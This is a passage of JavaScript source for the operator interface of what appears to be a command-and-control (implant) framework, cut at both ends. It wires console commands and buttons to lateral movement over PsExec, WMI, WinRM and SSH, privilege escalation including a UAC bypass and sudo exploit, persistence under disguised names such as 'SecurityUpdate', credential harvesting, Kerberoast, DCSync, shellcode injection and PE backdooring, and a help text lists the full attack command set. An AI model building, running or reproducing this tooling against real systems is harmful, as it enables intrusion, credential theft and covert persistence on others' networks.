          inputHtml = `<select id="csb-f-${id}-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
        } else {
          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
          const val = p.default || '';
          const ph = p.placeholder || '';
          inputHtml = `<input id="csb-f-${id}-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
        }
        field.innerHTML = `<label style="color:var(--muted);font-size:10.5px;font-weight:600">${esc(p.label).toUpperCase()} ${p.required ? '<span style="color:var(--accent)">*</span>' : ''}</label>${inputHtml}`;
        formEl.appendChild(field);
      });
    } else {
      formEl.innerHTML = `<div style="color:var(--muted);font-size:11px;grid-column:1/-1">无需额外参数。点击“预览”或“执行”，在 <b>${esc(obj.hostname || id.slice(0,8))}</b> 上运行此方案。</div>`;
    }

    cardEl.style.display = 'block';
  }

  function getParams() {
    if (!activeScript) return {};
    const map = {};
    if (activeScript.params) {
      activeScript.params.forEach(p => {
        const el = document.getElementById(`csb-f-${id}-${p.name}`);
        if (el) map[p.name] = el.value;
      });
    }
    return map;
  }

  btnPrev?.addEventListener('click', async () => {
    if (!activeScript) return;
    btnPrev.disabled = true;
    appendOut(id, `[*] 正在生成方案预览：${activeScript.name}...`, 'pending');
    try {
      const pmap = getParams();
      const res = await App().ScriptPreview(id, activeScript.method, pmap);
      if (res.error) {
        appendOut(id, `[error] ${res.error}`, 'err');
      } else {
        appendOut(id, res.output, 'info');
      }
    } catch (e) {
      appendOut(id, `[error] ${e}`, 'err');
    }
    btnPrev.disabled = false;
  });

  btnExec?.addEventListener('click', async () => {
    if (!activeScript) return;
    btnExec.disabled = true;
    const method = activeScript.method;
    const pmap = getParams();

    appendOut(id, `[*] 正在执行脚本方案：${activeScript.name}...`, 'cmd');
    let result;
    try {
      switch (method) {
        case 'ScriptSpawnLocal':
          result = await App().ScriptSpawnLocal(id, pmap.targetOS || 'windows', pmap.arch || 'amd64', pmap.profileName || '');
          if (!result.error) renderGraph();
          break;
        case 'ScriptSSHDeploy':
          result = await App().ScriptSSHDeploy(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.beaconPath || '');
          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSpawnLinux':
          result = await App().ScriptSpawnLinux(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.listenerURL || '');
          if (!result.error) { recordJump(id, pmap.targetHost); renderGraph(); }
          break;
        case 'ScriptSSHExecSimple':
          result = await App().ScriptSSHExecSimple(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '', pmap.command || 'id');
          break;
        case 'ScriptSSHCheck':
          result = await App().ScriptSSHCheck(id, pmap.targetHost || '', parseInt(pmap.targetPort) || 22, pmap.user || 'root', pmap.pass || '');
          break;
        case 'ScriptSpawnWindows':
          result = await App().ScriptSpawnWindows(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.listenerURL || '');
          break;
        case 'ScriptPsExec':
          result = await App().ScriptPsExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptWMIExec':
          result = await App().ScriptWMIExec(id, pmap.targetHost || '', 135, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami');
          break;
        case 'ScriptWinRMExec':
          result = await App().ScriptWinRMExec(id, pmap.targetHost || '', 5985, pmap.user || 'Administrator', pmap.pass || '', pmap.command || 'whoami; hostname');
          break;
        case 'ScriptSCDeploy':
          result = await App().ScriptSCDeploy(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptSMBUploadExec':
          result = await App().ScriptSMBUploadExec(id, pmap.targetHost || '', 445, pmap.user || 'Administrator', pmap.pass || '', pmap.beaconPath || '');
          break;
        case 'ScriptPrivescCheck':
          result = await App().ScriptPrivescCheck(id);
          break;
        case 'ScriptSudoExploit':
          result = await App().ScriptSudoExploit(id, pmap.method || 'find');
          break;
        case 'ScriptWinPrivescCheck':
          result = await App().ScriptWinPrivescCheck(id);
          break;
        case 'ScriptTokenImpersonate':
          result = await App().ScriptTokenImpersonate(id, pmap.targetUser || '');
          break;
        case 'ScriptGetSystem':
          result = await App().ScriptGetSystem(id, pmap.profile || '');
          break;
        case 'ScriptUACBypass':
          result = await App().ScriptUACBypass(id, pmap.beaconPath || '');
          break;
        case 'ScriptPersistCron':
          result = await App().ScriptPersistCron(id, pmap.cronLine || '');
          break;
        case 'ScriptPersistSSHKey':
          result = await App().ScriptPersistSSHKey(id, pmap.pubKey || '', pmap.targetUser || 'root');
          break;
        case 'ScriptPersistSystemd':
          result = await App().ScriptPersistSystemd(id, pmap.serviceName || 'system-update', pmap.execPath || '/tmp/.svc');
          break;
        case 'ScriptPersistRegRun':
          result = await App().ScriptPersistRegRun(id, pmap.beaconPath || '', pmap.name || 'SecurityUpdate');
          break;
        case 'ScriptPersistSchedTask':
          result = await App().ScriptPersistSchedTask(id, pmap.beaconPath || '', pmap.taskName || '');
          break;
        case 'ScriptPersistService':
          result = await App().ScriptPersistService(id, pmap.beaconPath || '', pmap.svcName || 'WinUpdateSvc');
          break;
        case 'ScriptPersistWMI':
          result = await App().ScriptPersistWMI(id, pmap.beaconPath || '');
          break;
        case 'ScriptPersistStartup':
          result = await App().ScriptPersistStartup(id, pmap.beaconPath || '');
          break;
        case 'ScriptHarvestCreds':
          result = await App().ScriptHarvestCreds(id);
          break;
        case 'ScriptWinHarvestCreds':
          result = await App().ScriptWinHarvestCreds(id);
          break;
        case 'ScriptKerberoast':
          result = await App().ScriptKerberoast(id);
          break;
        case 'ScriptDCSync':
          result = await App().ScriptDCSync(id);
          break;
        case 'ScriptNetworkScan':
          result = await App().ScriptNetworkScan(id, pmap.subnet || '192.168.50', pmap.ports || '22 445 3306 2375 3000');
          break;
        case 'ScriptADEnum':
          result = await App().ScriptADEnum(id);
          break;
        case 'ScriptWinLocalEnum':
          result = await App().ScriptWinLocalEnum(id);
          break;
        default:
          result = { error: '未知脚本：' + method };
      }
    } catch (e) {
      result = { error: String(e) };
    }

    btnExec.disabled = false;
    if (result.error) {
      appendOut(id, `[error] ${result.error}${result.output ? '\n' + result.output : ''}`, 'err');
    } else {
      appendOut(id, result.output || '[+] 完成', 'ok');
    }
  });
}

function activateTab(id) {
  document.querySelectorAll('.interact-tab').forEach(t => t.classList.toggle('active', t.dataset.tid === id));
  document.querySelectorAll('.interact-panel').forEach(p => p.classList.toggle('active', p.id === `ip-${id}`));
  // The tab already shows the hostname — the label shows only the extra detail
  // (user · os/arch) so the name isn't repeated twice in the bar.
  const t = openTabs[id], label = document.getElementById('interact-label');
  activeInteractId = (t && t.obj) ? id : null;   // only real agents have notes
  if (label) label.textContent = '';             // tab already shows the agent; no extra label
  document.getElementById(`cinp-${id}`)?.focus();
}
function closeTab(id) {
  const t = openTabs[id];
  // Tear down an interactive shell's tunnel + event listeners on close.
  if (t && t.kind === 'shell') {
    App().StopInteractiveShell(t.tid).catch(()=>{});
    if (window.runtime) { window.runtime.EventsOff(t.evtOut); window.runtime.EventsOff(t.evtClose); }
  }
  delete openTabs[id];
  document.querySelector(`.interact-tab[data-tid="${id}"]`)?.remove();
  document.getElementById(`ip-${id}`)?.remove();
  const first = document.querySelector('.interact-tab');
  if (first) activateTab(first.dataset.tid);
}

// ── Command execution ──────────────────────────────────────────────────────
const HELP_TEXT = `
Core commands (session & beacon):
  help                       Show this help
  info                       Show agent info
  clear                      Clear the console
  shell <cmd>                Run a command in the OS shell (raw text works too)
  shell -i  (or  pty)        Open a real-time interactive shell (session only)
  execute <path> [args]      Run a program directly (no shell wrapper)
  grep [-r] <pattern> <path> Search file contents on the target
  mount                      List mounted drives/filesystems
  memfiles [list|add|rm <fd>]  Anonymous in-memory files
  ssh <user>@<host>[:port] [-p <pass>] <cmd>   Run a command over SSH from the implant
  ps                         List processes
  ls [path]                  List files (uses current dir)
  cd <path>                  Change working directory
  pwd                        Show current directory
  download <remote> [local]  Download a file (2nd arg = local path, else dialog)
  upload <local> <remote>    Upload a local file to the target (or 'upload' for dialog)
  cat <remote>               Print a remote text file
  mkdir <path>               Create a directory
  rm <path>                  Remove a file/dir
  mv <src> <dst>             Move/rename a file
  cp <src> <dst>             Copy a file
  screenshot                 Capture the desktop
  netstat                    Network connections
  ifconfig                   Network interfaces
  env / getenv <name>        Environment variables
  setenv <K> <V>             Set an env var
  unsetenv <K>               Unset an env var
  reg query|read|write|read-hive ...   Windows registry (HKLM/HKCU/...)
  whoami                     Current token owner
  getprivs                   Token privileges (Windows)
  procdump <pid>             Dump process memory
  kill <pid>                 Terminate a remote process
  loot [add <file>|rm <id>]  Save a target file to the shared loot store / list

  chmod <path> <mode>        Change file mode (e.g. 0755)
  chown <path> <uid> <gid>   Change file owner

Privilege / execution (session only):
  getsystem <profile> [proc] Escalate to SYSTEM via an implant profile
  make-token <dom> <u> <p>   Create a token from credentials
  impersonate <user>         Impersonate a logged-on user
  rev2self                   Drop an impersonated token
  runas -u <u> [-p <p>] <prog> [args]   Run a program as another user
  migrate <pid> <profile>    Migrate the implant into another process
  execute-assembly <local.exe> [args]   Run a .NET assembly (path or dialog)
  execute-shellcode <local.bin> [pid]   Inject shellcode (path or dialog)
  sideload <local.dll> [args]           Sideload a DLL/.so (path or dialog)
  spawndll <local.dll> [args]           Reflectively load a DLL (path or dialog)
  extensions                            List installed + loaded extensions/BOFs
  ext <command> [args...]               Run an extension/BOF (e.g. ext sa-whoami)
  wasm [list|register <f> [name]|exec <name> [args]]   WASM extensions
  execute-windows [-t][-H][--ppid <pid>] <path> [args]  Execute w/ token/PPID spoof (Windows)
  ping                                  Round-trip liveness check (session)
  wg-forwarders / wg-list-socks         List active WireGuard forwarders / socks
  close                                 Gracefully close this session
  backdoor <remote_pe> <profile>        Backdoor an on-disk PE with an implant
  dllhijack <ref_dll> <target> <profile>  Plant a hijacking DLL
  msf <payload> <lhost> <lport>         Run a Metasploit payload in-process
  msf-inject <payload> <lhost> <lport> <pid>  Inject an msf payload into a PID

Pivoting / tunneling (session only):
  socks start <port>|stop|status
  portfwd add <lport> <rhost> <rport> | rm <lport> | list
  rportfwd add <bindport> <fwdhost> <fwdport> | rm <id> | list
  wg-portfwd add <lport> <rhost:port> | rm <id>   (WireGuard implants)
  wg-socks <port> | stop <id>                      (WireGuard implants)
  pivot  start tcp|pipe <bind> | stop <id> | list
  services [detail <name>|start <name>]   Windows services (list / inspect / start)

Beacon only:
  tasks                      Show the beacon task queue
  reconfig <interval> <jitter>   Change the beacon check-in interval (seconds)
  interactive                Open an interactive session from this beacon
  (all commands are queued and run on next check-in)

Scripts (session & beacon — auto-generate + deploy):
  spawn <os> <arch> <profile>                             Spawn new beacon on CURRENT host (no creds needed)
                                                          e.g. spawn windows x64 my-http-profile
                                                          e.g. spawn linux x64 my-mtls-profile
  spawn linux <user>@<host> [-p <pass>] <profile>         Generate + deploy to remote via SSH
  spawn windows <user>@<host> [-p <pass>] <profile>       Generate + deploy to remote via PsExec
  jump ssh <user>@<host> [-p <pass>] <profile>            Alias for remote spawn linux
  jump psexec <user>@<host> [-p <pass>] <profile>         Alias for remote spawn windows
  jump winrm <user>@<host> [-p <pass>] <cmd>              Execute via WinRM
  jump wmi <user>@<host> [-p <pass>] <cmd>                Execute via WMI
  privesc-check                  Enumerate privilege escalation vectors
  harvest                        Search for credentials, keys, tokens
  ad-enum                        Enumerate Active Directory (domain info, admins, SPNs)
  local-enum                     Local system enumeration (whoami, admins, AV, network)
  kerberoast                     Request TGS tickets for offline cracking
  persist cron <line>            Add cron persistence
  persist reg <name> <path>      Add registry Run key persistence
  persist schtask <name> <path>  Add scheduled task persistence
  persist service <name> <path>  Install as Windows service
  scan <subnet> [ports]          Port scan from implant (e.g. scan 192.168.50 22,445,3306)

  NOTE: Create profiles first in Profiles panel or Server console:
    profiles new --mtls 10.10.10.1:8443 --os windows --arch amd64 --beacon --name win-mtls
    profiles new --http 10.10.10.1:8080 --os linux --arch amd64 --beacon --name lin-http
`.trim();

// Split a command line into tokens, respecting single/double quotes so a quoted
// argument (e.g. execute cmd.exe /c "net user X /add && ...") stays one token.
function tok(s) {
  const out = [], re = /"([^"]*)"|'([^']*)'|(\S+)/g; let m;
  while ((m = re.exec(s)) !== null) out.push(m[1] !== undefined ? m[1] : (m[2] !== undefined ? m[2] : m[3]));
  return out;
}

async function runAgentCmd(kind, id, inp, hist) {
  const raw = inp.value.trim(); if (!raw) return;
  hist.unshift(raw); inp.value = '';
  appendOut(id, raw, 'cmd');
  inp.disabled = true;
  try {
    await dispatchCmd(kind, id, raw);
  } catch (e) {
    appendOut(id, `[error] ${e}`, 'err');
  } finally {
    inp.disabled = false; inp.focus();
  }
}

async function dispatchCmd(kind, id, raw) {
  const parts = tok(raw);
  const cmd = parts[0].toLowerCase();
  const args = parts.slice(1);
  const tab = openTabs[id] || {};

  // ── universal built-ins ──
  if (cmd === 'help') return appendOut(id, HELP_TEXT, 'info');
  if (cmd === 'clear') { const o = document.getElementById(`cout-${id}`); if (o) o.innerHTML = ''; return; }
  if (cmd === 'info') { const o = tab.obj; return appendOut(id, `ID: ${o.id}\nHost: ${o.hostname}\nUser: ${o.username}\nOS: ${o.os}/${o.arch}\nPID: ${o.pid}\nTransport: ${o.transport}\nRemote: ${o.remoteAddress}`, 'info'); }
  if (cmd === 'tasks' && kind === 'beacon') return showTasks(id);
  if ((cmd === 'shell' && (!args.length || args[0] === '-i')) || cmd === 'pty') {
    if (kind !== 'session') return appendOut(id, '[!] interactive shell requires a session (beacons are async). For a beacon use: shell <command>', 'err');
    return openInteractiveShell(id, tab.obj);
  }

  // ── beacons: queue command, then poll for the result (non-blocking) ──
  if (kind === 'beacon') {
    if (cmd === 'reconfig') {
      if (args.length < 2) return appendOut(id, 'usage: reconfig <interval_sec> <jitter_sec>', 'err');
      await App().ReconfigureBeacon(id, parseInt(args[0]), parseInt(args[1]));
      return appendOut(id, `[+] reconfigure queued — interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
    }
    if (cmd === 'interactive') {
      await App().InteractiveBeacon(id);
      return appendOut(id, '[+] interactive session requested — it will appear as a session on next check-in', 'ok');
    }
    const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
    const target = tab.obj?.hostname || id.slice(0, 8);
    const localTask = taskStore.create({
      type: 'beacon-command', title: 'Beacon 命令', target, agentId: id,
      status: 'queued', summary: '正在提交到 Teamserver', timeoutMs: 6 * 60 * 1000,
      policy: '取得远程任务编号后可取消；主动轮询 6 分钟，超时后保留为等待状态。',
    });
    const r = await App().ExecuteBeaconCommandAsync(id, shellCmd).catch(error => ({ error }));
    if (r.error) {
      const info = rpcError(r.error, 'Beacon 命令提交失败');
      const safeMessage = RpcErrors.safeRpcErrorMessage(r.error, 'Beacon 命令提交失败');
      taskStore.update(localTask.id, { status: info.cancelled ? 'cancelled' : 'failed', summary: safeMessage, error: safeMessage });
      return appendOut(id, `[error] ${info.message}`, 'err');
    }
    if (r.status === 'completed') {
      taskStore.update(localTask.id, { status: 'success', summary: '命令已完成' });
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    if (r.taskId) {
      taskStore.update(localTask.id, { status: 'waiting', remoteTaskId: r.taskId, canCancel: true, summary: '已排队，等待信标回连' });
      appendOut(id, `[*] task ${r.taskId.slice(0,8)} queued — polling for result...`, 'pending');
      pollBeaconResult(id, r.taskId, localTask.id);
    } else {
      taskStore.update(localTask.id, { status: 'waiting', summary: '命令已排队，等待信标回连' });
      appendOut(id, '[*] command queued — waiting for beacon check-in', 'pending');
    }
    return;
  }

  // ── session commands ──
  switch (cmd) {
    case 'ps': {
      const procs = await App().GetProcessList(id);
      let out = 'PID     PPID    OWNER                EXECUTABLE\n';
      procs.forEach(p => { out += `${String(p.pid).padEnd(8)}${String(p.ppid).padEnd(8)}${(p.owner||'').slice(0,20).padEnd(21)}${p.executable||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'pwd': { const p = await App().PrintWorkingDir(id); tab.cwd = p; return appendOut(id, p, 'out'); }
    case 'cd': {
      if (!args[0]) return appendOut(id, 'usage: cd <path>', 'err');
      const p = await App().ChangeDir(id, args.join(' '));
      tab.cwd = p;
      return appendOut(id, p, 'out');
    }
    case 'ls': {
      const path = args[0] || tab.cwd || '.';
      const r = await App().ListFiles(id, path);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      tab.cwd = r.path || path;
      let out = `${tab.cwd}\n`;
      (r.files||[]).forEach(f => { out += `${f.isDir?'d':'-'} ${(f.mode||'').padEnd(11)} ${String(f.isDir?'':fmtSize(f.size)).padStart(9)}  ${f.name}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'download': {
      if (!args[0]) return appendOut(id, 'usage: download <remote> [local]   (no local path → save dialog)', 'err');
      // Two args = CLI style download to a specific local path; one arg = save dialog.
      const r = args.length >= 2
        ? await App().DownloadFileTo(id, args[0], args[1])
        : await runFileTransfer('download', id, args[0]);
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] ${args[0]} -> ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out');
    }
    case 'upload': {
      // upload <local> <remote> (CLI) | upload [remote] (open dialog for local)
      const r = args.length >= 2
        ? await App().UploadFileFrom(id, args[0], args[1])
        : await runFileTransfer('upload', id, args[0] || '');
      return appendOut(id, r.error ? `[error] ${r.error}` : `[+] uploaded -> ${r.path} (${fmtSize(r.bytes)})`, r.error?'err':'out');
    }
    case 'screenshot': {
      appendOut(id, '[*] capturing...', 'pending');
      const dataUrl = await App().TakeScreenshot(id).catch(e => null);
      if (!dataUrl) return appendOut(id, '[error] screenshot failed', 'err');
      return appendImg(id, dataUrl);
    }
    case 'netstat': {
      const entries = await App().GetNetstat(id);
      let out = 'PROTO  LOCAL                 REMOTE                STATE        PID    PROCESS\n';
      entries.forEach(e => { out += `${(e.protocol||'').padEnd(7)}${(e.localAddr||'').padEnd(22)}${(e.remoteAddr||'').padEnd(22)}${(e.state||'').padEnd(13)}${String(e.pid||'').padEnd(7)}${e.process||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'env': {
      const vars = await App().GetEnvVars(id);
      return appendOut(id, vars.map(v => `${v.key}=${v.value}`).join('\n'), 'out');
    }
    case 'whoami': {
      const owner = await App().CurrentTokenOwner(id).catch(() => null);
      if (owner) return appendOut(id, owner, 'out');
      return dispatchCmd(kind, id, 'shell whoami');
    }
    case 'kill': case 'terminate': {
      if (!args[0]) return appendOut(id, `usage: ${cmd} <pid>`, 'err');
      if (!(await uiConfirm(`确定终止远程进程 PID ${esc(args[0])} 吗？`, { title:'终止进程', okLabel:'终止', danger:true }))) return;
      await App().KillRemoteProcess(id, parseInt(args[0]));
      return appendOut(id, `[+] terminated PID ${args[0]}`, 'out');
    }
    case 'getsystem': {
      if (!args[0]) return appendOut(id, 'usage: getsystem <profile> [hosting_process]', 'err');
      const err = await App().GetSystem(id, args[1] || '', args[0]).then(() => null).catch(e => String(e));
      if (err) {
        if (err.includes('main.go') || err.includes('parse') || err.includes('IDENT')) {
          return appendOut(id, `[error] the teamserver failed to generate the shellcode implant for getsystem (server-side codegen error, not the GUI). This is a known Sliver server issue with shellcode/inject generation. Workaround: use the service-persistence method (sc create + a generated exe) to get SYSTEM, which you've already done successfully.`, 'err');
        }
        return appendOut(id, `[error] ${err}`, 'err');
      }
      return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it — watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) — that returns a SYSTEM session directly.', 'info');
    }
    case 'make-token': {
      if (args.length < 3) return appendOut(id, 'usage: make-token <domain> <username> <password>', 'err');
      await App().MakeToken(id, args[1], args[0], args.slice(2).join(' '));
      return appendOut(id, '[+] token created', 'out');
    }
    case 'impersonate': {
      if (!args[0]) return appendOut(id, 'usage: impersonate <user>', 'err');
      await App().ImpersonateUser(id, args.join(' '));
      return appendOut(id, `[+] impersonating ${args.join(' ')}`, 'out');
    }
    case 'rev2self': { await App().RevToSelf(id); return appendOut(id, '[+] reverted to self', 'out'); }
    case 'execute-assembly': {
      // execute-assembly <local-path> [assembly args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] running ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().ExecuteAssembly(id, args[0] || '', args.slice(1).join(' '));
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.output && r.output.trim()) return appendOut(id, r.output.trimEnd(), 'out');
      return appendOut(id, '[+] executed, but NO output was captured.\n    execute-assembly runs .NET/CLR assemblies ONLY. If this is a native binary\n    (e.g. mimikatz.exe), use: upload it then `execute`, or `sideload` the mimikatz DLL.', 'info');
    }
    case 'sideload': {
      // sideload <local-path> [args]   (no path = file dialog)
      appendOut(id, args.length ? `[*] sideloading ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
      const r = await App().Sideload(id, args[0] || '', args.slice(1).join(' '), '');
      return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
    }
    case 'socks': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'start') { await App().StartSocksProxy(id, parseInt(args[1])||1080); return appendOut(id, `[+] SOCKS5 on 127.0.0.1:${parseInt(args[1])||1080}`, 'out'); }
      if (sub === 'stop')  { if (!(await uiConfirm('确定停止此会话的 SOCKS5 代理吗？', { title:'停止 SOCKS5', okLabel:'停止', danger:true }))) return; await App().StopSocksProxy(id); return appendOut(id, '[+] SOCKS5 stopped', 'out'); }
      const p = await App().SocksProxyStatus(id);
      return appendOut(id, p ? `[*] SOCKS5 active on 127.0.0.1:${p}` : '[*] no SOCKS5 proxy running', 'info');
    }
    case 'portfwd': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'add') { await App().AddPortForward(id, parseInt(args[1]), args[2], parseInt(args[3])); return appendOut(id, `[+] 127.0.0.1:${args[1]} -> ${args[2]}:${args[3]}`, 'out'); }
      if (sub === 'rm')  { if (!(await uiConfirm(`确定停止本地端口 ${esc(args[1])} 的转发吗？`, { title:'停止端口转发', okLabel:'停止', danger:true }))) return; await App().RemovePortForward(id, parseInt(args[1])); return appendOut(id, `[+] removed forward on :${args[1]}`, 'out'); }
      const fwds = await App().ListPortForwards(id);
      return appendOut(id, fwds.length ? fwds.map(f => `127.0.0.1:${f.localPort} -> ${f.remote}`).join('\n') : '[*] no port forwards', 'info');
    }
    case 'pivot': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'start') { await App().StartPivotListener(id, args[1]||'tcp', args[2]||'0.0.0.0:9898'); return appendOut(id, `[+] pivot listener started (${args[1]||'tcp'} ${args[2]||'0.0.0.0:9898'})`, 'out'); }
      if (sub === 'stop')  { if (!(await uiConfirm(`确定停止 Pivot ${esc(args[1])} 吗？下游连接可能受影响。`, { title:'停止 Pivot', okLabel:'停止', danger:true }))) return; await App().StopPivotListener(id, parseInt(args[1])); return appendOut(id, `[+] pivot ${args[1]} stopped`, 'out'); }
      const pv = await App().ListPivots(id);
      return appendOut(id, pv.length ? pv.map(p => `#${p.id} ${p.type} ${p.bindAddress}`).join('\n') : '[*] no pivot listeners', 'info');
    }
    case 'services': {
      const sub = (args[0]||'').toLowerCase();
      if (sub === 'detail' || sub === 'info') {
        if (!args[1]) return appendOut(id, 'usage: services detail <name>', 'err');
        const d = await App().ServiceDetail(id, '', args[1]);
        return appendOut(id, `Name:        ${d.name}\nDisplay:     ${d.displayName}\nStatus:      ${d.status}\nStartup:     ${d.startupType}\nAccount:     ${d.account}\nBinPath:     ${d.binPath}\nDescription: ${d.description}`, 'out');
      }
      if (sub === 'start') {
        if (!args[1]) return appendOut(id, 'usage: services start <name>', 'err');
        await App().StartServiceByName(id, '', args[1]);
        return appendOut(id, `[+] service ${args[1]} start requested`, 'out');
      }
      const svcs = await App().ListServices(id);
      let out = 'STATUS      NAME                           DISPLAY\n';
      svcs.forEach(s => { out += `${(s.status||'').padEnd(12)}${(s.name||'').slice(0,30).padEnd(31)}${s.displayName||''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'grep': {
      if (args.length < 2) return appendOut(id, 'usage: grep [-r] <pattern> <path>', 'err');
      const recursive = args[0] === '-r';
      const a2 = recursive ? args.slice(1) : args;
      const pattern = a2[0], path = a2.slice(1).join(' ');
      const res = await App().GrepFiles(id, pattern, path, recursive);
      return appendOut(id, res, 'out');
    }
    case 'mount': {
      const mounts = await App().ListMounts(id);
      if (!mounts.length) return appendOut(id, '[*] no mounts', 'info');
      let out = 'MOUNT           FS         TYPE       LABEL           FREE/TOTAL\n';
      const gb = n => (n/1073741824).toFixed(1)+'G';
      mounts.forEach(m => { out += `${(m.mountPoint||'').slice(0,14).padEnd(16)}${(m.fileSystem||'').padEnd(11)}${(m.type||'').padEnd(11)}${(m.label||'').slice(0,14).padEnd(16)}${m.totalSpace?`${gb(m.freeSpace)}/${gb(m.totalSpace)}`:''}\n`; });
      return appendOut(id, out.trimEnd(), 'out');
    }
    case 'memfiles': {
      const sub = (args[0]||'list').toLowerCase();
      if (sub === 'add') { const fd = await App().MemfilesAdd(id); return appendOut(id, `[+] created memfile fd=${fd}`, 'out'); }
      if (sub === 'rm')  { if (!args[1]) return appendOut(id, 'usage: memfiles rm <fd>', 'err'); await App().MemfilesRm(id, parseInt(args[1])); return appendOut(id, `[+] removed fd=${args[1]}`, 'out'); }
      const res = await App().MemfilesList(id);
      return appendOut(id, res, 'out');
    }
    case 'ssh': {
      if (args.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>  (prompts nothing; add password with -p <pass>)', 'err');
      let pass = '';
      const pi = args.indexOf('-p');
      if (pi >= 0) { pass = args[pi+1]||''; args.splice(pi, 2); }
      const target = args[0]; const cmd = args.slice(1).join(' ');
      const at = target.split('@'); if (at.length < 2) return appendOut(id, 'usage: ssh <user>@<host>[:port] <command...>', 'err');
      const user = at[0]; const hp = at[1].split(':'); const host = hp[0]; const port = parseInt(hp[1]||'22');
      const r = await App().SSHExec(id, host, port, user, pass, cmd);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    case 'wasm': {
      const sub = (args[0]||'list').toLowerCase();
      if (sub === 'register') { if (!args[1]) return appendOut(id, 'usage: wasm register <local.wasm> [name]', 'err'); await App().RegisterWasmExtension(id, args[2]||'', args[1]); return appendOut(id, `[+] registered WASM extension`, 'out'); }
      if (sub === 'exec') { if (!args[1]) return appendOut(id, 'usage: wasm exec <name> [args...]', 'err'); const r = await App().ExecWasmExtension(id, args[1], args.slice(2)); if (r.error) return appendOut(id, `[error] ${r.error}`, 'err'); if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out'); if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err'); return; }
      const names = await App().ListWasmExtensions(id);
      return appendOut(id, names.length ? names.join('\n') : '[*] no WASM extensions registered', names.length?'out':'info');
    }
    case 'ping': {
      const t0 = Date.now();
      try { await App().PingSession(id); return appendOut(id, `[+] pong (${Date.now()-t0}ms)`, 'out'); }
      catch (e) { return appendOut(id, `[error] ${e}`, 'err'); }
    }
    case 'execute-windows': case 'execw': {
      const useToken = args.includes('-t'), hide = args.includes('-H');
      let ppid = 0; const pi = args.indexOf('--ppid'); if (pi >= 0) { ppid = parseInt(args[pi+1])||0; }
      const rest = args.filter((a,idx) => !a.startsWith('-') && !(pi>=0 && idx===pi+1));
      if (!rest.length) return appendOut(id, 'usage: execute-windows [-t] [-H] [--ppid <pid>] <path> [args...]', 'err');
      const r = await App().ExecuteWindowsAdvanced(id, rest[0], rest.slice(1), useToken, hide, ppid);
      if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
      if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
      if (r.stderr) appendOut(id, r.stderr.trimEnd(), 'err');
      return;
    }
    case 'wg-forwarders': {
      const f = await App().ListWGForwarders(id);
      return appendOut(id, f.length ? f.map(x => `#${x.id} ${x.localAddr} -> ${x.remoteAddr}`).join('\n') : '[*] no WG forwarders', f.length?'out':'info');
    }
    case 'wg-list-socks': {
      const s = await App().ListWGSocks(id);
      return appendOut(id, s.length ? s.map(x => `#${x.id} ${x.localAddr}`).join('\n') : '[*] no WG socks servers', s.length?'out':'info');
    }
    case 'close': {
      if (kind !== 'session') return appendOut(id, '[!] close applies to sessions (use kill-beacon for beacons)', 'err');
      await App().CloseSessionGraceful(id);
      return appendOut(id, '[+] session close requested (graceful)', 'out');
    }
    case 'mkdir': {
      if (!args[0]) return appendOut(id, 'usage: mkdir <path>', 'err');
      await App().MakeDirectory(id, args[0]);
      return appendOut(id, `[+] created ${args[0]}`, 'out');
    }
    case 'rm': case 'rmdir': {
      if (!args[0]) return appendOut(id, 'usage: rm <path>', 'err');
      if (!(await uiConfirm(`确定删除目标上的“${esc(args[0])}”吗？`, { title:'删除远程文件', okLabel:'删除', danger:true }))) return;
      await App().RemoveFile(id, args[0]);
      return appendOut(id, `[+] removed ${args[0]}`, 'out');
    }
    case 'setenv': {
